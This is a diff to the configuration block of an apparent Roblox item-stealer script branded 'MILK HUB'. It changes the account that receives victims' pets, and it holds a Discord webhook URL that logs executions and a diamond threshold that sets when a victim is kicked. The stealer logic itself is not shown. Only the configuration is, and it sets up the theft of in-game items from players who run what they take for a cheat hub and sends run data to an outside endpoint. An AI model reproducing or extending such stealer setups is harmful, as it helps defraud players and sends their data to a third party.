@@ -1,4 +1,4 @@
-_G.Username = "WATERMELON_FARM24" --// Username To Send Pets To 
+_G.Username = "NINJAMASTER13262" --// Username To Send Pets To 
 _G.ScriptName = "MILK HUB" --// Script Name For Watermark 
 _G.Webhook = "https://discord.com/api/webhooks/935702783590535232/0JyV701m9YECOXdEkSBb3JwsxJxN-pMu43qdo2ar8luQKsBXPdmt4CsX1ZKwXk_tkGbi" --// Discord Webhook For Executions 
 _G.GiftMessage = "500000" --// Message For The Gift To Say _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick 
